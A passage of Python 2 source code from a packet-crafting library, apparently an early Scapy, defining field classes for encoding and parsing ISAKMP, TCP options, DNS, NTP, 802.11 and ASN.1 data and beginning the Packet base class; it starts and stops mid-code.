        StrField.__init__(self, name, default, shift=shift)
        self.length_from = length_from
        if fld is not None or shift != 0:
            FIELD_LENGTH_MANAGEMENT_DEPRECATION(self.__class__.__name__)
            self.length_from = lambda pkt,fld=fld,shift=shift: getattr(pkt,fld)-shift
    def getfield(self, pkt, s):
        l = self.length_from(pkt)
        return s[l:], self.m2i(pkt,s[:l])

class FieldListField(Field):
    islist=1
    def __init__(self, name, default, field, fld=None, shift=0, length_from=None, count_from=None):
        if default is None:
            default = []  # Create a new list for each instance
        Field.__init__(self, name, default)
        self.count_from = count_from
        self.length_from = length_from
        self.field = field
        if fld is not None or shift != 0:
            FIELD_LENGTH_MANAGEMENT_DEPRECATION(self.__class__.__name__)
            self.count_from = lambda pkt,fld=fld,shift=shift: getattr(pkt,fld)-shift


    def i2count(self, pkt, val):
        if type(val) is list:
            return len(val)
        return 1
    def i2len(self, pkt, val):
        return sum( self.field.i2len(pkt,v) for v in val )

    def i2m(self, pkt, val):
        if val is None:
            val = []
        return val
    def any2i(self, pkt, x):
        if type(x) is not list:
            return [x]
        else:
            return x
    def addfield(self, pkt, s, val):
        val = self.i2m(pkt, val)
        for v in val:
            s = self.field.addfield(pkt, s, v)
        return s
    def getfield(self, pkt, s):
        c = l = None
        if self.length_from is not None:
            l = self.length_from(pkt)
        elif self.count_from is not None:
            c = self.count_from(pkt)

        val = []
        ret=""
        if l is not None:
            s,ret = s[:l],s[l:]

        while s:
            if c is not None:
                if c <= 0:
                    break
                c -= 1
            s,v = self.field.getfield(pkt, s)
            val.append(v)
        return s+ret, val

class FieldLenField(Field):
    def __init__(self, name, default,  length_of=None, fmt = "H", count_of=None, adjust=lambda pkt,x:x, fld=None):
        Field.__init__(self, name, default, fmt)
        self.length_of=length_of
        self.count_of=count_of
        self.adjust=adjust
        if fld is not None:
            FIELD_LENGTH_MANAGEMENT_DEPRECATION(self.__class__.__name__)
            self.length_of = fld
    def i2m(self, pkt, x):
        if x is None:
            if self.length_of is not None:
                fld,fval = pkt.getfield_and_val(self.length_of)
                f = fld.i2len(pkt, fval)
            else:
                fld,fval = pkt.getfield_and_val(self.count_of)
                f = fld.i2count(pkt, fval)
            x = self.adjust(pkt,f)
        return x

# see http://www.iana.org/assignments/ipsec-registry for details
ISAKMPAttributeTypes= { "Encryption":    (1, { "DES-CBC"  : 1,
                                                "IDEA-CBC" : 2,
                                                "Blowfish-CBC" : 3,
                                                "RC5-R16-B64-CBC" : 4,
                                                "3DES-CBC" : 5,
                                                "CAST-CBC" : 6,
                                                "AES-CBC" : 7,
                                                "CAMELLIA-CBC" : 8, }, 0),
                         "Hash":          (2, { "MD5": 1,
                                                "SHA": 2,
                                                "Tiger": 3,
                                                "SHA2-256": 4,
                                                "SHA2-384": 5,
                                                "SHA2-512": 6,}, 0),
                         "Authentication":(3, { "PSK": 1,
                                                "DSS": 2,
                                                "RSA Sig": 3,
                                                "RSA Encryption": 4,
                                                "RSA Encryption Revised": 5,
                                                "ElGamal Encryption": 6,
                                                "ElGamal Encryption Revised": 7,
                                                "ECDSA Sig": 8,
                                                "HybridInitRSA": 64221,
                                                "HybridRespRSA": 64222,
                                                "HybridInitDSS": 64223,
                                                "HybridRespDSS": 64224,
                                                "XAUTHInitPreShared": 65001,
                                                "XAUTHRespPreShared": 65002,
                                                "XAUTHInitDSS": 65003,
                                                "XAUTHRespDSS": 65004,
                                                "XAUTHInitRSA": 65005,
                                                "XAUTHRespRSA": 65006,
                                                "XAUTHInitRSAEncryption": 65007,
                                                "XAUTHRespRSAEncryption": 65008,
                                                "XAUTHInitRSARevisedEncryption": 65009,
                                                "XAUTHRespRSARevisedEncryptio": 65010, }, 0),
                         "GroupDesc":     (4, { "768MODPgr"  : 1,
                                                "1024MODPgr" : 2,
                                                "EC2Ngr155"  : 3,
                                                "EC2Ngr185"  : 4,
                                                "1536MODPgr" : 5,
                                                "2048MODPgr" : 14,
                                                "3072MODPgr" : 15,
                                                "4096MODPgr" : 16,
                                                "6144MODPgr" : 17,
                                                "8192MODPgr" : 18, }, 0),
                         "GroupType":      (5,  {"MODP":       1,
                                                 "ECP":        2,
                                                 "EC2N":       3}, 0),
                         "GroupPrime":     (6,  {}, 1),
                         "GroupGenerator1":(7,  {}, 1),
                         "GroupGenerator2":(8,  {}, 1),
                         "GroupCurveA":    (9,  {}, 1),
                         "GroupCurveB":    (10, {}, 1),
                         "LifeType":       (11, {"Seconds":     1,
                                                 "Kilobytes":   2,  }, 0),
                         "LifeDuration":   (12, {}, 1),
                         "PRF":            (13, {}, 0),
                         "KeyLength":      (14, {}, 0),
                         "FieldSize":      (15, {}, 0),
                         "GroupOrder":     (16, {}, 1),
                         }

# the name 'ISAKMPTransformTypes' is actually a misnomer (since the table
# holds info for all ISAKMP Attribute types, not just transforms, but we'll
# keep it for backwards compatibility... for now at least
ISAKMPTransformTypes = ISAKMPAttributeTypes

ISAKMPTransformNum = {}
for n in ISAKMPTransformTypes:
    val = ISAKMPTransformTypes[n]
    tmp = {}
    for e in val[1]:
        tmp[val[1][e]] = e
    ISAKMPTransformNum[val[0]] = (n,tmp, val[2])
del(n)
del(e)
del(tmp)
del(val)


class ISAKMPTransformSetField(StrLenField):
    islist=1
    def type2num(self, (typ,val)):
        type_val,enc_dict,tlv = ISAKMPTransformTypes.get(typ, (typ,{},0))
        val = enc_dict.get(val, val)
        s = ""
        if (val & ~0xffff):
            if not tlv:
                warning("%r should not be TLV but is too big => using TLV encoding" % typ)
            n = 0
            while val:
                s = chr(val&0xff)+s
                val >>= 8
                n += 1
            val = n
        else:
            type_val |= 0x8000
        return struct.pack("!HH",type_val, val)+s
    def num2type(self, typ, enc):
        val = ISAKMPTransformNum.get(typ,(typ,{}))
        enc = val[1].get(enc,enc)
        return (val[0],enc)
    def i2m(self, pkt, i):
        if i is None:
            return ""
        i = map(self.type2num, i)
        return "".join(i)
    def m2i(self, pkt, m):
        # I try to ensure that we don't read off the end of our packet based
        # on bad length fields we're provided in the packet. There are still
        # conditions where struct.unpack() may not get enough packet data, but
        # worst case that should result in broken attributes (which would
        # be expected). (wam)
        lst = []
        while len(m) >= 4:
            trans_type, = struct.unpack("!H", m[:2])
            is_tlv = not (trans_type & 0x8000)
            if is_tlv:
                # We should probably check to make sure the attribute type we
                # are looking at is allowed to have a TLV format and issue a
                # warning if we're given an TLV on a basic attribute.
                value_len, = struct.unpack("!H", m[2:4])
                if value_len+4 > len(m):
                    warning("Bad length for ISAKMP tranform type=%#6x" % trans_type)
                value = m[4:4+value_len]
                value = reduce(lambda x,y: (x<<8L)|y, struct.unpack("!%s" % ("B"*len(value),), value),0)
            else:
                trans_type &= 0x7fff
                value_len=0
                value, = struct.unpack("!H", m[2:4])
            m=m[4+value_len:]
            lst.append(self.num2type(trans_type, value))
        if len(m) > 0:
            warning("Extra bytes after ISAKMP transform dissection [%r]" % m)
        return lst

class StrNullField(StrField):
    def addfield(self, pkt, s, val):
        return s+self.i2m(pkt, val)+"\x00"
    def getfield(self, pkt, s):
        l = s.find("\x00")
        if l < 0:
            #XXX \x00 not found
            return "",s
        return s[l+1:],self.m2i(pkt, s[:l])
    def randval(self):
        return RandTermString(RandNum(0,1200),"\x00")

class StrStopField(StrField):
    def __init__(self, name, default, stop, additionnal=0):
        Field.__init__(self, name, default)
        self.stop=stop
        self.additionnal=additionnal
    def getfield(self, pkt, s):
        l = s.find(self.stop)
        if l < 0:
            return "",s
#            raise Scapy_Exception,"StrStopField: stop value [%s] not found" %stop
        l += len(self.stop)+self.additionnal
        return s[l:],s[:l]
    def randval(self):
        return RandTermString(RandNum(0,1200),self.stop)

class LenField(Field):
    def i2m(self, pkt, x):
        if x is None:
            x = len(pkt.payload)
        return x

class BCDFloatField(Field):
    def i2m(self, pkt, x):
        return int(256*x)
    def m2i(self, pkt, x):
        return x/256.0

class BitField(Field):
    def __init__(self, name, default, size):
        Field.__init__(self, name, default)
        self.rev = size < 0
        self.size = abs(size)
    def reverse(self, val):
        if self.size == 16:
            val = socket.ntohs(val)
        elif self.size == 32:
            val = socket.ntohl(val)
        return val

    def addfield(self, pkt, s, val):
        val = self.i2m(pkt, val)
        if type(s) is tuple:
            s,bitsdone,v = s
        else:
            bitsdone = 0
            v = 0
        if self.rev:
            val = self.reverse(val)
        v <<= self.size
        v |= val & ((1L<<self.size) - 1)
        bitsdone += self.size
        while bitsdone >= 8:
            bitsdone -= 8
            s = s+struct.pack("!B", v >> bitsdone)
            v &= (1L<<bitsdone)-1
        if bitsdone:
            return s,bitsdone,v
        else:
            return s
    def getfield(self, pkt, s):
        if type(s) is tuple:
            s,bn = s
        else:
            bn = 0
        # we don't want to process all the string
        nb_bytes = (self.size+bn-1)/8 + 1
        w = s[:nb_bytes]

        # split the substring byte by byte
        bytes = struct.unpack('!%dB' % nb_bytes , w)

        b = 0L
        for c in range(nb_bytes):
            b |= long(bytes[c]) << (nb_bytes-c-1)*8

        # get rid of high order bits
        b &= (1L << (nb_bytes*8-bn)) - 1

        # remove low order bits
        b = b >> (nb_bytes*8 - self.size - bn)

        if self.rev:
            b = self.reverse(b)

        bn += self.size
        s = s[bn/8:]
        bn = bn%8
        b = self.m2i(pkt, b)
        if bn:
            return (s,bn),b
        else:
            return s,b
    def randval(self):
        return RandNum(0,2**self.size-1)


class BitFieldLenField(BitField):
    def __init__(self, name, default, size, length_of=None, count_of=None, adjust=lambda pkt,x:x):
        BitField.__init__(self, name, default, size)
        self.length_of=length_of
        self.count_of=count_of
        self.adjust=adjust
    def i2m(self, pkt, x):
        return FieldLenField.i2m.im_func(self, pkt, x)


class XBitField(BitField):
    def i2repr(self, pkt, x):
        return lhex(self.i2h(pkt,x))


class EnumField(Field):
    def __init__(self, name, default, enum, fmt = "H"):
        i2s = self.i2s = {}
        s2i = self.s2i = {}
        if type(enum) is list:
            keys = xrange(len(enum))
        else:
            keys = enum.keys()
        if filter(lambda x: type(x) is str, keys):
            i2s,s2i = s2i,i2s
        for k in keys:
            i2s[k] = enum[k]
            s2i[enum[k]] = k
        Field.__init__(self, name, default, fmt)
    def any2i_one(self, pkt, x):
        if type(x) is str:
            x = self.s2i[x]
        return x
    def i2repr_one(self, pkt, x):
        if self not in conf.noenum and not isinstance(x,VolatileValue) and x in self.i2s:
            return self.i2s[x]
        return repr(x)

    def any2i(self, pkt, x):
        if type(x) is list:
            return map(lambda z,pkt=pkt:self.any2i_one(pkt,z), x)
        else:
            return self.any2i_one(pkt,x)
    def i2repr(self, pkt, x):
        if type(x) is list:
            return map(lambda z,pkt=pkt:self.i2repr_one(pkt,z), x)
        else:
            return self.i2repr_one(pkt,x)

class CharEnumField(EnumField):
    def __init__(self, name, default, enum, fmt = "1s"):
        EnumField.__init__(self, name, default, enum, fmt)
        k = self.i2s.keys()
        if k and len(k[0]) != 1:
            self.i2s,self.s2i = self.s2i,self.i2s
    def any2i_one(self, pkt, x):
        if len(x) != 1:
            x = self.s2i[x]
        return x

class BitEnumField(BitField,EnumField):
    def __init__(self, name, default, size, enum):
        EnumField.__init__(self, name, default, enum)
        self.rev = size < 0
        self.size = abs(size)
    def any2i(self, pkt, x):
        return EnumField.any2i(self, pkt, x)
    def i2repr(self, pkt, x):
        return EnumField.i2repr(self, pkt, x)

class ShortEnumField(EnumField):
    def __init__(self, name, default, enum):
        EnumField.__init__(self, name, default, enum, "H")

class LEShortEnumField(EnumField):
    def __init__(self, name, default, enum):
        EnumField.__init__(self, name, default, enum, "<H")

class ByteEnumField(EnumField):
    def __init__(self, name, default, enum):
        EnumField.__init__(self, name, default, enum, "B")

class IntEnumField(EnumField):
    def __init__(self, name, default, enum):
        EnumField.__init__(self, name, default, enum, "I")

class SignedIntEnumField(EnumField):
    def __init__(self, name, default, enum):
        EnumField.__init__(self, name, default, enum, "i")
    def randval(self):
        return RandSInt()

class LEIntEnumField(EnumField):
    def __init__(self, name, default, enum):
        EnumField.__init__(self, name, default, enum, "<I")

class XShortEnumField(ShortEnumField):
    def i2repr_one(self, pkt, x):
        if self not in conf.noenum and not isinstance(x,VolatileValue) and x in self.i2s:
            return self.i2s[x]
        return lhex(x)

# Little endian long field
class LELongField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "<Q")

# Little endian fixed length field
class LEFieldLenField(FieldLenField):
    def __init__(self, name, default,  length_of=None, fmt = "<H", count_of=None, adjust=lambda pkt,x:x, fld=None):
        FieldLenField.__init__(self, name, default, length_of=length_of, fmt=fmt, fld=fld, adjust=adjust)


class FlagsField(BitField):
    def __init__(self, name, default, size, names):
        BitField.__init__(self, name, default, size)
        self.multi = type(names) is list
        if self.multi:
            self.names = map(lambda x:[x], names)
        else:
            self.names = names
    def any2i(self, pkt, x):
        if type(x) is str:
            if self.multi:
                x = map(lambda y:[y], x.split("+"))
            y = 0
            for i in x:
                y |= 1 << self.names.index(i)
            x = y
        return x
    def i2repr(self, pkt, x):
        if type(x) is list or type(x) is tuple:
            return repr(x)
        if self.multi:
            r = []
        else:
            r = ""
        i=0
        while x:
            if x & 1:
                r += self.names[i]
            i += 1
            x >>= 1
        if self.multi:
            r = "+".join(r)
        return r





class IPoptionsField(StrField):
    def i2m(self, pkt, x):
        return x+"\x00"*(3-((len(x)+3)%4))
    def getfield(self, pkt, s):
        opsz = (pkt.ihl-5)*4
        if opsz < 0:
            warning("bad ihl (%i). Assuming ihl=5"%pkt.ihl)
            opsz = 0
        return s[opsz:],s[:opsz]
    def randval(self):
        return RandBin(RandNum(0,39))


TCPOptions = (
              { 0 : ("EOL",None),
                1 : ("NOP",None),
                2 : ("MSS","!H"),
                3 : ("WScale","!B"),
                4 : ("SAckOK",None),
                5 : ("SAck","!"),
                8 : ("Timestamp","!II"),
                14 : ("AltChkSum","!BH"),
                15 : ("AltChkSumOpt",None)
                },
              { "EOL":0,
                "NOP":1,
                "MSS":2,
                "WScale":3,
                "SAckOK":4,
                "SAck":5,
                "Timestamp":8,
                "AltChkSum":14,
                "AltChkSumOpt":15,
                } )

class TCPOptionsField(StrField):
    islist=1
    def getfield(self, pkt, s):
        opsz = (pkt.dataofs-5)*4
        if opsz < 0:
            warning("bad dataofs (%i). Assuming dataofs=5"%pkt.dataofs)
            opsz = 0
        return s[opsz:],self.m2i(pkt,s[:opsz])
    def m2i(self, pkt, x):
        opt = []
        while x:
            onum = ord(x[0])
            if onum == 0:
                opt.append(("EOL",None))
                x=x[1:]
                break
            if onum == 1:
                opt.append(("NOP",None))
                x=x[1:]
                continue
            olen = ord(x[1])
            if olen < 2:
                warning("Malformed TCP option (announced length is %i)" % olen)
                olen = 2
            oval = x[2:olen]
            if TCPOptions[0].has_key(onum):
                oname, ofmt = TCPOptions[0][onum]
                if onum == 5: #SAck
                    ofmt += "%iI" % (len(oval)/4)
                if ofmt and struct.calcsize(ofmt) == len(oval):
                    oval = struct.unpack(ofmt, oval)
                    if len(oval) == 1:
                        oval = oval[0]
                opt.append((oname, oval))
            else:
                opt.append((onum, oval))
            x = x[olen:]
        return opt

    def i2m(self, pkt, x):
        opt = ""
        for oname,oval in x:
            if type(oname) is str:
                if oname == "NOP":
                    opt += "\x01"
                    continue
                elif oname == "EOL":
                    opt += "\x00"
                    continue
                elif TCPOptions[1].has_key(oname):
                    onum = TCPOptions[1][oname]
                    ofmt = TCPOptions[0][onum][1]
                    if onum == 5: #SAck
                        ofmt += "%iI" % len(oval)
                    if ofmt is not None and (type(oval) is not str or "s" in ofmt):
                        if type(oval) is not tuple:
                            oval = (oval,)
                        oval = struct.pack(ofmt, *oval)
                else:
                    warning("option [%s] unknown. Skipped."%oname)
                    continue
            else:
                onum = oname
                if type(oval) is not str:
                    warning("option [%i] is not string."%onum)
                    continue
            opt += chr(onum)+chr(2+len(oval))+oval
        return opt+"\x00"*(3-((len(opt)+3)%4))
    def randval(self):
        return [] # XXX


class DNSStrField(StrField):
    def i2m(self, pkt, x):
        x = [k[:63] for k in x.split(".")] # Truncate chunks that cannont be encoded (more than 63 bytes..)
        x = map(lambda y: chr(len(y))+y, x)
        x = "".join(x)
        if x[-1] != "\x00":
            x += "\x00"
        return x
    def getfield(self, pkt, s):
        n = ""
        while 1:
            l = ord(s[0])
            s = s[1:]
            if not l:
                break
            if l & 0xc0:
                raise Scapy_Exception("DNS message can't be compressed at this point!")
            else:
                n += s[:l]+"."
                s = s[l:]
        return s, n


class DNSRRCountField(ShortField):
    holds_packets=1
    def __init__(self, name, default, rr):
        ShortField.__init__(self, name, default)
        self.rr = rr
    def _countRR(self, pkt):
        x = getattr(pkt,self.rr)
        i = 0
        while isinstance(x, DNSRR) or isinstance(x, DNSQR):
            x = x.payload
            i += 1
        return i

    def i2m(self, pkt, x):
        if x is None:
            x = self._countRR(pkt)
        return x
    def i2h(self, pkt, x):
        if x is None:
            x = self._countRR(pkt)
        return x


def DNSgetstr(s,p):
    name = ""
    q = 0
    jpath = [p]
    while 1:
        if p >= len(s):
            warning("DNS RR prematured end (ofs=%i, len=%i)"%(p,len(s)))
            break
        l = ord(s[p])
        p += 1
        if l & 0xc0:
            if not q:
                q = p+1
            if p >= len(s):
                warning("DNS incomplete jump token at (ofs=%i)" % p)
                break
            p = ((l & 0x3f) << 8) + ord(s[p]) - 12
            if p in jpath:
                warning("DNS decompression loop detected")
                break
            jpath.append(p)
            continue
        elif l > 0:
            name += s[p:p+l]+"."
            p += l
            continue
        break
    if q:
        p = q
    return name,p


class DNSRRField(StrField):
    holds_packets=1
    def __init__(self, name, countfld, passon=1):
        StrField.__init__(self, name, None)
        self.countfld = countfld
        self.passon = passon
    def i2m(self, pkt, x):
        if x is None:
            return ""
        return str(x)
    def decodeRR(self, name, s, p):
        ret = s[p:p+10]
        type,cls,ttl,rdlen = struct.unpack("!HHIH", ret)
        p += 10
        rr = DNSRR("\x00"+ret+s[p:p+rdlen])
        if rr.type in [2, 3, 4, 5]:
            rr.rdata = DNSgetstr(s,p)[0]
        del(rr.rdlen)

        p += rdlen

        rr.rrname = name
        return rr,p
    def getfield(self, pkt, s):
        if type(s) is tuple :
            s,p = s
        else:
            p = 0
        ret = None
        c = getattr(pkt, self.countfld)
        if c > len(s):
            warning("wrong value: DNS.%s=%i" % (self.countfld,c))
            return s,""
        while c:
            c -= 1
            name,p = DNSgetstr(s,p)
            rr,p = self.decodeRR(name, s, p)
            if ret is None:
                ret = rr
            else:
                ret.add_payload(rr)
        if self.passon:
            return (s,p),ret
        else:
            return s[p:],ret


class DNSQRField(DNSRRField):
    holds_packets=1
    def decodeRR(self, name, s, p):
        ret = s[p:p+4]
        p += 4
        rr = DNSQR("\x00"+ret)
        rr.qname = name
        return rr,p



class RDataField(StrLenField):
    def m2i(self, pkt, s):
        family = None
        if pkt.type == 1:
            family = socket.AF_INET
        elif pkt.type == 28:
            family = socket.AF_INET6
        elif pkt.type == 12:
            s = DNSgetstr(s, 0)[0]
        if family is not None:
            s = inet_ntop(family, s)
        return s
    def i2m(self, pkt, s):
        if pkt.type == 1:
            if s:
                s = inet_aton(s)
        elif pkt.type == 28:
            if s:
                s = inet_pton(socket.AF_INET6, s)
        elif pkt.type in [2,3,4,5]:
            s = "".join(map(lambda x: chr(len(x))+x, s.split(".")))
            if ord(s[-1]):
                s += "\x00"
        return s

class RDLenField(Field):
    def __init__(self, name):
        Field.__init__(self, name, None, "H")
    def i2m(self, pkt, x):
        if x is None:
            rdataf = pkt.get_field("rdata")
            x = len(rdataf.i2m(pkt, pkt.rdata))
        return x
    def i2h(self, pkt, x):
        if x is None:
            rdataf = pkt.get_field("rdata")
            x = len(rdataf.i2m(pkt, pkt.rdata))
        return x

# seconds between 01-01-1900 and 01-01-1970
ntp_basetime = 2208988800

class TimeStampField(BitField):
    def __init__(self, name, default, size):
        BitField.__init__(self, name, default, size)
        self.size  = size
    def getfield(self, pkt, s):
        s,timestamp = BitField.getfield(self, pkt, s)

        if timestamp:
            # timestamp is a 64 bits field :
            #  + first 32 bits : number of seconds since 1900
            #  + last 32 bits  : fraction part
            timestamp >>= 32
            timestamp -= ntp_basetime

            from time import gmtime, strftime
            b = strftime("%a, %d %b %Y %H:%M:%S +0000", gmtime(timestamp))
        else:
            b = 'None'

        return s, b
    def addfield(self, pkt, s, val):
        t = -1
        if type(val) is str:
            from time import strptime, mktime
            t = int(mktime(strptime(val))) + ntp_basetime + 3600
        else:
            if val == -1:
                from time import time
                t = int(time()) + ntp_basetime
            else:
                t = val
        t <<= 32
        return BitField.addfield(self,pkt,s, t)

class FloatField(BitField):
    def getfield(self, pkt, s):
        s,b = BitField.getfield(self, pkt, s)

        # fraction point between bits 15 and 16.
        sec = b >> 16
        frac = b & (1L << (32+1)) - 1
        frac /= 65536.0
        b = sec+frac
        return s,b

class Dot11SCField(LEShortField):
    def is_applicable(self, pkt):
        return pkt.type != 1 # control frame
    def addfield(self, pkt, s, val):
        if self.is_applicable(pkt):
            return LEShortField.addfield(self, pkt, s, val)
        else:
            return s
    def getfield(self, pkt, s):
        if self.is_applicable(pkt):
            return LEShortField.getfield(self, pkt, s)
        else:
            return s,None

#####################
#### ASN1 Fields ####
#####################

class ASN1F_badsequence(Exception):
    pass

class ASN1F_element:
    pass

class ASN1F_field(ASN1F_element):
    holds_packets=0
    islist=0

    ASN1_tag = ASN1_Class_UNIVERSAL.ANY

    def __init__(self, name, default):
        self.name = name
        self.default = default

    def i2repr(self, pkt, x):
        if x is None:
            x = 0
        return repr(x)
    def i2h(self, pkt, x):
        if x is None:
            x = 0
        return x
    def any2i(self, pkt, x):
        return x
    def m2i(self, pkt, x):
        return self.ASN1_tag.get_codec(pkt.ASN1_codec).safedec(x)
    def i2m(self, pkt, x):
        if x is None:
            x = 0
        if isinstance(x, ASN1_Object):
            if ( self.ASN1_tag == ASN1_Class_UNIVERSAL.ANY
                 or x.tag == ASN1_Class_UNIVERSAL.RAW
                 or x.tag == ASN1_Class_UNIVERSAL.ERROR
                 or self.ASN1_tag == x.tag ):
                return x.enc(pkt.ASN1_codec)
            else:
                raise ASN1_Error("Encoding Error: got %r instead of an %r for field [%s]" % (x, self.ASN1_tag, self.name))
        return self.ASN1_tag.get_codec(pkt.ASN1_codec).enc(x)

    def do_copy(self, x):
        if hasattr(x, "copy"):
            return x.copy()
        if type(x) is list:
            x = x[:]
            for i in xrange(len(x)):
                if isinstance(x[i], Packet):
                    x[i] = x[i].copy()
        return x

    def build(self, pkt):
        return self.i2m(pkt, getattr(pkt, self.name))

    def set_val(self, pkt, val):
        setattr(pkt, self.name, val)

    def dissect(self, pkt, s):
        v,s = self.m2i(pkt, s)
        self.set_val(pkt, v)
        return s

    def get_fields_list(self):
        return [self]

    def __hash__(self):
        return hash(self.name)
    def __str__(self):
        return self.name
    def __eq__(self, other):
        return self.name == other
    def __repr__(self):
        return self.name
    def randval(self):
        return RandInt()


class ASN1F_INTEGER(ASN1F_field):
    ASN1_tag= ASN1_Class_UNIVERSAL.INTEGER
    def randval(self):
        return RandNum(-2**64, 2**64-1)

class ASN1F_enum_INTEGER(ASN1F_INTEGER):
    def __init__(self, name, default, enum):
        ASN1F_INTEGER.__init__(self, name, default)
        i2s = self.i2s = {}
        s2i = self.s2i = {}
        if type(enum) is list:
            keys = xrange(len(enum))
        else:
            keys = enum.keys()
        if filter(lambda x: type(x) is str, keys):
            i2s,s2i = s2i,i2s
        for k in keys:
            i2s[k] = enum[k]
            s2i[enum[k]] = k
    def any2i_one(self, pkt, x):
        if type(x) is str:
            x = self.s2i[x]
        return x
    def i2repr_one(self, pkt, x):
        return self.i2s.get(x, repr(x))

    def any2i(self, pkt, x):
        if type(x) is list:
            return map(lambda z,pkt=pkt:self.any2i_one(pkt,z), x)
        else:
            return self.any2i_one(pkt,x)
    def i2repr(self, pkt, x):
        if type(x) is list:
            return map(lambda z,pkt=pkt:self.i2repr_one(pkt,z), x)
        else:
            return self.i2repr_one(pkt,x)

class ASN1F_STRING(ASN1F_field):
    ASN1_tag = ASN1_Class_UNIVERSAL.STRING
    def randval(self):
        return RandString(RandNum(0, 1000))

class ASN1F_OID(ASN1F_field):
    ASN1_tag = ASN1_Class_UNIVERSAL.OID
    def randval(self):
        return RandOID()

class ASN1F_SEQUENCE(ASN1F_field):
    ASN1_tag = ASN1_Class_UNIVERSAL.SEQUENCE
    def __init__(self, *seq, **kargs):
        if "ASN1_tag" in kargs:
            self.ASN1_tag = kargs["ASN1_tag"]
        self.seq = seq
    def __repr__(self):
        return "<%s%r>" % (self.__class__.__name__,self.seq,)
    def get_fields_list(self):
        return reduce(lambda x,y: x+y.get_fields_list(), self.seq, [])
    def build(self, pkt):
        s = reduce(lambda x,y: x+y.build(pkt), self.seq, "")
        return self.i2m(pkt, s)
    def dissect(self, pkt, s):
        codec = self.ASN1_tag.get_codec(pkt.ASN1_codec)
        try:
            i,s,remain = codec.check_type_check_len(s)
            for obj in self.seq:
                s = obj.dissect(pkt,s)
            if s:
                warning("Too many bytes to decode sequence: [%r]" % s) # XXX not reversible!
            return remain
        except ASN1_Error,e:
            raise ASN1F_badsequence(e)

class ASN1F_SEQUENCE_OF(ASN1F_SEQUENCE):
    holds_packets = 1
    islist = 1
    def __init__(self, name, default, asn1pkt, ASN1_tag=0x30):
        self.asn1pkt = asn1pkt
        self.tag = chr(ASN1_tag)
        self.name = name
        self.default = default
    def get_fields_list(self):
        return [self]
    def build(self, pkt):
        val = getattr(pkt, self.name)
        if isinstance(val, ASN1_Object) and val.tag == ASN1_Class_UNIVERSAL.RAW:
            s = val
        else:
            s = "".join(map(str, val ))
        return self.i2m(pkt, s)
    def dissect(self, pkt, s):
        codec = self.ASN1_tag.get_codec(pkt.ASN1_codec)
        i,s1,remain = codec.check_type_check_len(s)
        lst = []
        while s1:
            try:
                p = self.asn1pkt(s1)
            except ASN1F_badsequence:
                lst.append(Raw(s1))
                break
            lst.append(p)
            if Raw in p:
                s1 = p[Raw].load
                del(p[Raw].underlayer.payload)
            else:
                break
        self.set_val(pkt, lst)
        return remain
    def randval(self):
        return fuzz(self.asn1pkt())

class ASN1F_PACKET(ASN1F_field):
    holds_packets = 1
    def __init__(self, name, default, cls):
        ASN1_field.__init__(self, name, default)
        self.cls = cls
    def i2m(self, pkt, x):
        if x is None:
            x = ""
        return str(x)
    def extract_packet(self, cls, x):
        try:
            c = cls(x)
        except ASN1F_badsequence:
            c = Raw(x)
        cpad = c[Padding]
        x = ""
        if cpad is not None:
            x = cpad.load
            del(cpad.underlayer.payload)
        return c,x
    def m2i(self, pkt, x):
        return self.extract_packet(self.cls, x)


class ASN1F_CHOICE(ASN1F_PACKET):
    ASN1_tag = ASN1_Class_UNIVERSAL.NONE
    def __init__(self, name, default, *args):
        self.name=name
        self.choice = {}
        for p in args:
            self.choice[p.ASN1_root.ASN1_tag] = p
#        self.context=context
        self.default=default
    def m2i(self, pkt, x):
        if len(x) == 0:
            return Raw(),""
            raise ASN1_Error("ASN1F_CHOICE: got empty string")
        if ord(x[0]) not in self.choice:
            return Raw(x),"" # XXX return RawASN1 packet ? Raise error
            raise ASN1_Error("Decoding Error: choice [%i] not found in %r" % (ord(x[0]), self.choice.keys()))

        z = ASN1F_PACKET.extract_packet(self, self.choice[ord(x[0])], x)
        return z
    def randval(self):
        return RandChoice(*map(lambda x:fuzz(x()), self.choice.values()))



###########################
## Packet abstract class ##
###########################

class Packet_metaclass(type):
    def __new__(cls, name, bases, dct):
        newcls = super(Packet_metaclass, cls).__new__(cls, name, bases, dct)
        for f in newcls.fields_desc:
            f.register_owner(newcls)
        return newcls
    def __getattr__(self, attr):
        for k in self.fields_desc:
            if k.name == attr:
                return k
        raise AttributeError(attr)

class NewDefaultValues(Packet_metaclass):
    """NewDefaultValues metaclass. Example usage:
    class MyPacket(Packet):
        fields_desc = [ StrField("my_field", "my default value"),  ]

    class MyPacket_variant(MyPacket):
        __metaclass__ = NewDefaultValues
        my_field = "my new default value"
    """
    def __new__(cls, name, bases, dct):
        fields = None
        for b in bases:
            if hasattr(b,"fields_desc"):
                fields = b.fields_desc
                break
        if fields is None:
            raise Scapy_Exception("No fields_desc in superclasses")

        new_fields = []
        for f in fields:
            if f.name in dct:
                f = f.copy()
                f.default = dct[f.name]
                del(dct[f.name])
            new_fields.append(f)
        dct["fields_desc"] = new_fields
        return super(NewDefaultValues, cls).__new__(cls, name, bases, dct)

class Packet(Gen):
    __metaclass__ = Packet_metaclass
    name=None

    fields_desc = []

    aliastypes = []
    overload_fields = {}

    underlayer = None

    payload_guess = []
    initialized = 0
    show_indent=1
    explicit = 0

    @classmethod
    def from_hexcap(cls):
        return cls(import_hexcap())

    @classmethod
    def upper_bonds(self):
        for fval,upper in self.payload_guess:
            print "%-20s  %s" % (upper.__name__, ", ".join("%-12s" % ("%s=%r"%i) for i in fval.iteritems()))

    @classmethod
    def lower_bonds(self):
        for lower,fval in self.overload_fields.iteritems():
            print "%-20s  %s" % (lower.__name__, ", ".join("%-12s" % ("%s=%r"%i) for i in fval.iteritems()))

    def __init__(self, _pkt="", post_transform=None, _internal=0, _underlayer=None, **fields):
        self.time  = time.time()
        self.sent_time = 0
        if self.name is None:
            self.name = self.__class__.__name__
        self.aliastypes = [ self.__class__ ] + self.aliastypes
        self.default_fields = {}
        self.overloaded_fields = {}
        self.fields={}
        self.fieldtype={}
        self.packetfields=[]
        self.__dict__["payload"] = NoPayload()
        self.init_fields()
        self.underlayer = _underlayer
        self.initialized = 1
        if _pkt:
            self.dissect(_pkt)
            if not _internal:
                self.dissection_done(self)
        for f in fields.keys():
            self.fields[f] = self.get_field(f).any2i(self,fields[f])
        if type(post_transform) is list:
            self.post_transforms = post_transform
        elif post_transform is None:
            self.post_transforms = []
        else:
            self.post_transforms = [post_transform]

    def init_fields(self):
        self.do_init_fields(self.fields_desc)

    def do_init_fields(self, flist):
        for f in flist:
